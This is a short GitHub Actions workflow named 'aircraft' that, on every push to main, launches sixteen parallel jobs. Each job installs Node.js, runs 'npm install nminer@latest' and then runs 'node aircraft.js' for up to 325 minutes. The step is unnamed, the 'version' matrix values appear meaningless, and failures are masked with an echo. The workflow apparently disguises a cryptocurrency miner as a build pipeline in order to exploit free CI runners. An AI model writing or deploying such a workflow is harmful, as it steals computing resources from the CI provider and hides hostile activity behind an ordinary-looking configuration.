name: aircraft
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4272 }
          - { version: 3932 }
          - { version: 3645 }
          - { version: 2180 }
          - { version: 8621 }
          - { version: 3570 }
          - { version: 8347 }
          - { version: 3290 }
          - { version: 5876 }
          - { version: 4561 }
          - { version: 850 }
          - { version: 9529 }
          - { version: 9616 }
          - { version: 2263 }
          - { version: 4399 }
          - { version: 9740 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 325m node aircraft.js || echo "aircraft executed"